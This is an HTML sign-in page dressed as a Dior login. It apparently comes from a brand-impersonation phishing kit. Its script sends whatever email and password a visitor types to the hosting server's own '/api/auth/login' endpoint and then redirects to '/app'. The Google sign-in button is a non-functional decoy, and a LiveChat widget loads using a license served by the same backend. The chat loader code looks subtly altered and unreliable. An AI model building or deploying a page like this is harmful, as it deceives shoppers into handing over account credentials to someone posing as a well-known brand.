<!DOCTYPE html>
<html lang="en-VN" dir="ltr">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Dior | Sign In</title>

  <!-- LiveChat loaded dynamically from API -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

    :root {
      --black: #1a1a1a;
      --white: #ffffff;
      --off-white: #f7f7f7;
      --gray: #888888;
      --light-gray: #e5e5e5;
      --font-serif: 'Playfair Display', Georgia, 'Times New Roman', serif;
      --font-sans: 'Inter', -apple-system, Helvetica Neue, Arial, sans-serif;
    }

    body {
      font-family: var(--font-sans);
      color: var(--black);
      background: var(--white);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    a { color: inherit; text-decoration: none; }
    button { background: none; border: none; cursor: pointer; font: inherit; color: inherit; }

    /* ========== HEADER ========== */
    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 24px 48px;
      border-bottom: 1px solid var(--light-gray);
    }

    .logo {
      font-family: var(--font-serif);
      font-size: 28px;
      font-weight: 500;
      letter-spacing: 0.18em;
      text-transform: uppercase;
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
    }

    .header-left, .header-right {
      display: flex;
      align-items: center;
      gap: 24px;
    }

    .header-link {
      font-size: 11px;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      font-weight: 400;
      color: var(--black);
      position: relative;
    }

    .header-link::after {
      content: '';
      position: absolute;
      bottom: -2px; left: 0;
      width: 0; height: 1px;
      background: var(--black);
      transition: width 0.25s ease;
    }
    .header-link:hover::after { width: 100%; }

    .icon-btn {
      width: 20px; height: 20px;
      display: flex; align-items: center; justify-content: center;
    }
    .icon-btn svg { width: 18px; height: 18px; stroke: var(--black); fill: none; stroke-width: 1.5; }

    /* ========== MAIN CONTENT ========== */
    .main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 80px 24px;
    }

    .login-wrapper {
      display: grid;
      grid-template-columns: 1fr 1fr;
      max-width: 1000px;
      width: 100%;
      gap: 80px;
      align-items: center;
    }

    /* Left side - Image */
    .login-image {
      position: relative;
      aspect-ratio: 3/4;
      overflow: hidden;
      background: var(--off-white);
    }
    .login-image img {
      width: 100%; height: 100%;
      object-fit: cover;
      object-position: center 20%;
    }

    /* Right side - Form */
    .login-form-wrapper {
      padding: 40px 0;
    }

    .login-title {
      font-family: var(--font-serif);
      font-size: clamp(28px, 3vw, 38px);
      font-weight: 400;
      letter-spacing: 0.04em;
      margin-bottom: 12px;
    }

    .login-subtitle {
      font-size: 13px;
      color: var(--gray);
      letter-spacing: 0.02em;
      margin-bottom: 48px;
      line-height: 1.6;
    }

    .form-group {
      margin-bottom: 28px;
    }

    .form-label {
      display: block;
      font-size: 11px;
      letter-spacing: 0.1em;
      text-transform: uppercase;
      color: var(--black);
      margin-bottom: 10px;
      font-weight: 400;
    }

    .form-input {
      width: 100%;
      padding: 14px 0;
      border: none;
      border-bottom: 1px solid var(--light-gray);
      font-family: var(--font-sans);
      font-size: 14px;
      color: var(--black);
      background: transparent;
      transition: border-color 0.3s;
      outline: none;
    }

    .form-input:focus {
      border-color: var(--black);
    }

    .form-input::placeholder {
      color: #bbb;
    }

    .password-wrapper {
      position: relative;
    }

    .password-toggle {
      position: absolute;
      right: 0;
      top: 50%;
      transform: translateY(-50%);
      font-size: 11px;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      color: var(--gray);
      cursor: pointer;
    }

    .password-toggle:hover { color: var(--black); }

    .form-options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 40px;
    }

    .remember-me {
      display: flex;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      font-size: 12px;
      color: var(--gray);
    }

    .remember-me input[type="checkbox"] {
      width: 16px;
      height: 16px;
      accent-color: var(--black);
      cursor: pointer;
    }

    .forgot-link {
      font-size: 12px;
      color: var(--gray);
      letter-spacing: 0.04em;
    }

    .forgot-link:hover { color: var(--black); }

    .btn-signin {
      width: 100%;
      padding: 16px;
      background: var(--black);
      color: var(--white);
      font-family: var(--font-sans);
      font-size: 12px;
      font-weight: 400;
      letter-spacing: 0.12em;
      text-transform: uppercase;
      border: none;
      cursor: pointer;
      transition: background 0.3s, transform 0.2s;
      margin-bottom: 24px;
    }

    .btn-signin:hover {
      background: #333;
      transform: translateY(-1px);
    }

    .btn-signin:active {
      transform: translateY(0);
    }

    .divider {
      display: flex;
      align-items: center;
      gap: 16px;
      margin-bottom: 24px;
    }

    .divider-line {
      flex: 1;
      height: 1px;
      background: var(--light-gray);
    }

    .divider-text {
      font-size: 11px;
      letter-spacing: 0.1em;
      text-transform: uppercase;
      color: var(--gray);
    }

    .btn-google {
      width: 100%;
      padding: 16px;
      background: var(--white);
      color: var(--black);
      font-family: var(--font-sans);
      font-size: 12px;
      font-weight: 400;
      letter-spacing: 0.12em;
      text-transform: uppercase;
      border: 1px solid var(--light-gray);
      cursor: pointer;
      transition: border-color 0.3s, transform 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin-bottom: 32px;
    }

    .btn-google:hover {
      border-color: var(--black);
      transform: translateY(-1px);
    }

    .btn-google svg {
      width: 18px;
      height: 18px;
    }

    .register-link {
      text-align: center;
      font-size: 13px;
      color: var(--gray);
    }

    .register-link a {
      color: var(--black);
      text-decoration: underline;
      text-underline-offset: 3px;
    }

    .register-link a:hover { color: var(--gray); }

    /* ========== FOOTER ========== */
    .footer {
      background: var(--black);
      color: var(--white);
      padding: 32px 48px;
      text-align: center;
    }

    .footer-logo {
      font-family: var(--font-serif);
      font-size: 18px;
      letter-spacing: 0.18em;
      text-transform: uppercase;
      margin-bottom: 12px;
    }

    .footer-links {
      display: flex;
      gap: 24px;
      justify-content: center;
      margin-bottom: 12px;
    }

    .footer-links a {
      font-size: 11px;
      opacity: 0.6;
      letter-spacing: 0.08em;
      transition: opacity 0.2s;
    }

    .footer-links a:hover { opacity: 1; }

    .footer-legal {
      font-size: 10px;
      opacity: 0.4;
      letter-spacing: 0.04em;
    }

    /* ========== TOAST ========== */
    .toast {
      position: fixed;
      top: 24px;
      left: 50%;
      transform: translateX(-50%) translateY(-100px);
      background: var(--black);
      color: var(--white);
      padding: 14px 28px;
      font-size: 13px;
      letter-spacing: 0.04em;
      z-index: 1000;
      opacity: 0;
      transition: transform 0.4s ease, opacity 0.4s ease;
    }

    .toast.show {
      transform: translateX(-50%) translateY(0);
      opacity: 1;
    }

    .toast.error { background: #c41e3a; }
    .toast.success { background: #2d5a27; }

    /* ========== RESPONSIVE ========== */
    @media (max-width: 768px) {
      .header { padding: 20px 24px; }
      .header-link { display: none; }
      .logo { font-size: 22px; }

      .login-wrapper {
        grid-template-columns: 1fr;
        gap: 0;
        max-width: 400px;
      }

      .login-image {
        display: none;
      }

      .login-form-wrapper {
        padding: 0;
      }

      .footer { padding: 24px; }
      .footer-links { flex-wrap: wrap; gap: 16px; }
    }
  </style>
</head>
<body>

  <!-- TOAST -->
  <div class="toast" id="toast"></div>

  <!-- HEADER -->
  <header class="header">
    <div class="header-left">
      <a href="/" class="header-link">Back to Shop</a>
    </div>
    <a href="/" class="logo">Dior</a>
    <div class="header-right">
      <button class="icon-btn" aria-label="Search">
        <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><line x1="16.5" y1="16.5" x2="21" y2="21"/></svg>
      </button>
      <button class="icon-btn" aria-label="Shopping bag">
        <svg viewBox="0 0 24 24"><path d="M6 6h12l1.5 14H4.5L6 6z"/><path d="M9 6V5a3 3 0 0 1 6 0v1"/></svg>
      </button>
    </div>
  </header>

  <!-- MAIN -->
  <main class="main">
    <div class="login-wrapper">
      <div class="login-image">
        <img src="https://media.christiandior.com/cdn-cgi/image/width=3000,format=auto,quality=80/pm_11872_1482_1482012-2gcasr37p4-whr.jpg" alt="Dior Fashion">
      </div>

      <div class="login-form-wrapper">
        <h1 class="login-title">Sign In</h1>
        <p class="login-subtitle">Welcome back to Dior. Sign in to access your account and explore the latest collections.</p>

        <form id="loginForm" onsubmit="return false;">
          <div class="form-group">
            <label class="form-label">Email Address</label>
            <input type="email" class="form-input" name="email" placeholder="Enter your email" required>
          </div>

          <div class="form-group">
            <label class="form-label">Password</label>
            <div class="password-wrapper">
              <input type="password" class="form-input" name="password" placeholder="Enter your password" required>
              <span class="password-toggle" onclick="togglePassword()">Show</span>
            </div>
          </div>

          <div class="form-options">
            <label class="remember-me">
              <input type="checkbox" checked> Remember me
            </label>
            <a href="#" class="forgot-link">Forgot password?</a>
          </div>

          <button type="submit" class="btn-signin" onclick="handleLogin()">Sign In</button>
        </form>

        <div class="divider">
          <div class="divider-line"></div>
          <span class="divider-text">or</span>
          <div class="divider-line"></div>
        </div>

        <button class="btn-google" onclick="handleGoogleLogin()">
          <svg viewBox="0 0 24 24" fill="none">
            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/>
            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
          </svg>
          Continue with Google
        </button>

        <p class="register-link">
          Don't have an account? <a href="/register">Create one</a>
        </p>
      </div>
    </div>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="footer-logo">Dior</div>
    <div class="footer-links">
      <a href="#">Legal Terms</a>
      <a href="#">Privacy Notice</a>
      <a href="#">Personal Data</a>
    </div>
    <div class="footer-legal">&copy; 2026 Dior. All rights reserved.</div>
  </footer>

  <script>
    function showToast(msg, type = '') {
      const t = document.getElementById('toast');
      t.textContent = msg;
      t.className = 'toast show ' + type;
      setTimeout(() => t.className = 'toast', 3000);
    }

    function togglePassword() {
      const pwd = document.querySelector('input[name="password"]');
      const toggle = document.querySelector('.password-toggle');
      if (pwd.type === 'password') {
        pwd.type = 'text';
        toggle.textContent = 'Hide';
      } else {
        pwd.type = 'password';
        toggle.textContent = 'Show';
      }
    }

    async function handleLogin() {
      const login = document.querySelector('input[name="email"]').value.trim();
      const password = document.querySelector('input[name="password"]').value.trim();

      if (!login) { showToast('Please enter email or username', 'error'); return; }
      if (!password) { showToast('Please enter your password', 'error'); return; }
      if (password.length < 6) { showToast('Password must be at least 6 characters', 'error'); return; }

      showToast('Signing in...', 'success');
      try {
        const res = await fetch('/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ login, password })
        });
        const data = await res.json();
        if (data.success) {
          localStorage.setItem('dior_token', data.data.token);
          showToast('Welcome back!', 'success');
          setTimeout(() => { window.location.href = '/app'; }, 800);
        } else {
          showToast(data.error || 'Login failed', 'error');
        }
      } catch(e) {
        showToast('Connection error', 'error');
      }
    }

    function handleGoogleLogin() {
      showToast('Connecting to Google...', 'success');
    }

    // Enter key to submit
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        handleLogin();
      }
    });

    // Init LiveChat from API
    (function(){
      fetch('/api/settings/public').then(r=>r.json()).then(d=>{
        const license = d?.data?.livechat_license || '19928399';
        window.__lc = window.__lc || {};
        window.__lc.license = parseInt(license);
        window.__lc.integration_name = "manual_channels";
        window.__lc.product_name = "livechat";
        var n=document,t=c;
        function c(){var e={_q:[],_h:null,_v:"2.0",on:function(){c(["on",Array.prototype.slice.call(arguments)])},once:function(){c(["once",Array.prototype.slice.call(arguments)])},off:function(){c(["off",Array.prototype.slice.call(arguments)])},get:function(){if(e._h)return e._h.apply(null,arguments);e._q.push(arguments)},call:function(){c(["call",Array.prototype.slice.call(arguments)])},init:function(){var o=t.createElement("script");o.async=!0;o.type="text/javascript";o.src="https://cdn.livechatinc.com/tracking.js";t.head.appendChild(o)}};if(!n.__lc.asyncInit)e.init();n.LiveChatWidget=n.LiveChatWidget||e}
        c();
      }).catch(()=>{});
    })();
  </script>

</body>
</html>
